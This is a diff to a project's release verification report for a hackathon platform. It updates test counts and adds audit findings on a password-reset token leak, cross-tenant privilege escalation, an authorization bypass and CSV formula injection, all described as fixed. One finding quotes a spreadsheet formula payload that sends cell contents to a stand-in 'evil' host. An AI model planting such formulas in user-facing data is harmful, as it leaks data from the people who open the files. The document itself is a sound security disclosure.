@@ -29,7 +29,7 @@ Everything here was run, and the counts are what the commands actually printed.
 | Command | Result |
 | --- | --- |
 | `npm run typecheck` | Pass. Both projects: core/api/tests/scripts, then the web app. |
-| `npm test` | **444 passed**, 0 failed, 70 suites. Includes the deployment test that builds the image and starts the stack when Docker is present. |
+| `npm test` | **460 passed**, 0 failed, 70 suites. Includes the deployment test that builds the image and starts the stack when Docker is present. |
 | `npm run build` | Pass. 505.46 kB JS, 146.44 kB gzipped, 16.66 kB CSS. |
 | `npm run test:e2e` | **50 passed**, 0 failed, 8 suites, real Chrome against the built bundle. |
 | `npm run acceptance` | **35 of 35 checks passed.** |
@@ -244,7 +244,7 @@ This is a property of the harness, not a product defect, and it is why
 | Threat model | Met | `THREAT-MODEL.md`: the general web surface, plus a section each on Sybil voting, ballot stuffing, submission scraping, judge collusion and deadline gaming. |
 | API reference | Met | `API.md`. The six documented defects in the published document are **fixed**, and the document is now checked against a live server by `openapi-truth.test.ts` on every `npm test`. |
 | Development guide | Met | `DEVELOPMENT.md`. |
-| Test suite | Met | 444 unit/integration, 50 browser, 35 acceptance. |
+| Test suite | Met | 460 unit/integration, 50 browser, 35 acceptance. |
 
 ---
 
@@ -290,10 +290,59 @@ Recorded because each is the kind that survives a demo and fails an event.
 26. `POST /api/events/{eventId}/tracks` returned **500** with a raw
     `UNIQUE constraint failed: event_tracks.event_id, event_tracks.slug` whenever
     a track name repeated. Nothing derived a free slug the way teams and
-    submissions already did, so a normal act of event configuration — adding a
+    submissions already do, so an ordinary act of event configuration — adding a
     second track — produced a server error. Fixed, with a regression test for the
     duplicate and a second test asserting every create route returns 201, which
     is the check whose absence let it survive.
+
+**Found by a focused adversarial audit**
+
+The audit drove the running application rather than reading it, and confirmed
+each of the following by exploitation. All four are fixed and all four are now
+regression tests.
+
+27. **Unauthenticated account takeover via password reset.**
+    `POST /api/auth/password-reset` returned the reset token in the response body
+    to an anonymous caller, in every environment. With the completion endpoint
+    that is takeover of anyone whose address is known, and the 5/hour IP budget
+    is no obstacle because one request per victim suffices. The token is now
+    returned only outside production; in production the response is byte-identical
+    whether or not the address exists, and the token is recorded in the audit
+    ledger for the operator. Asserted for both the production and demo paths.
+
+28. **Cross-tenant privilege escalation from a unioned role scope.** `Actor` held
+    one flat `eventIds` list containing every event the user had *any* role in.
+    `canManageEvent` tested `roles.includes('ORGANIZER') && eventIds.includes(id)`,
+    so a person who organized event A and merely judged event B was an organizer
+    of B — with the whole event-scoped surface behind it: registrations, the audit
+    ledger, webhooks, scores, rubric versions. Someone running one hackathon
+    while judging another is the ordinary case. `Actor.roleEventIds` now records
+    which role each event belongs to and the two event-scope authorities consult
+    it. The union is retained only for "is this actor involved here at all".
+
+29. **Any signed-in account could read the organizer's submission list.** The
+    guard read `!isManager && user === null`, so it stopped the anonymous case and
+    passed the full list — `DRAFT` rows included — to anyone who had signed in. A
+    freshly registered account was enough. The threat model asserted that a
+    participant gets 403; that was untested and false. Now `!isManager`, asserted
+    for anonymous, unrelated-account, participant and organizer.
+
+30. **Spreadsheet formula injection in every CSV export.** `escapeField` quoted on
+    `",\r\n` and did nothing about a leading `=`, `+`, `-` or `@`, so
+    `=HYPERLINK("http://evil/?leak="&A1,"x")` in a display name reached the
+    organizer's spreadsheet intact. Every export column is user-controlled and any
+    participant can set their own display name, which makes this
+    organizer-workstation injection rather than self-inflicted; the DDE variant is
+    command execution. Quoting is not a defence — a quoted formula is still a
+    formula — so a leading formula character is now prefixed with an apostrophe.
+    Eleven unit tests cover the variants.
+
+The audit also found that the two existing "cannot reach another event" tests
+were **silently vacuous**: the seed creates exactly one event, so both looked for
+a second one, did not find it, and fell through to a weaker assertion. The
+cross-tenant property — the single most important one in a multi-event platform —
+had no effective coverage. The new tests create the second event over the API and
+assert unconditionally.
 
 ---
 
@@ -368,7 +417,7 @@ Stated rather than hidden. None is a surprise; all are recorded in the docs.
 
 ## Release checklist
 
-- [x] `npm run verify` green: typecheck, 444 unit/integration, build, 50 browser, 35 acceptance
+- [x] `npm run verify` green: typecheck, 460 unit/integration, build, 50 browser, 35 acceptance
 - [x] OpenAPI document current, and checked against a live server on every test run
 - [x] Result pipeline deterministic and reproducible, verified from stored reviews
 - [x] Published results immutable, corrections supersede rather than rewrite
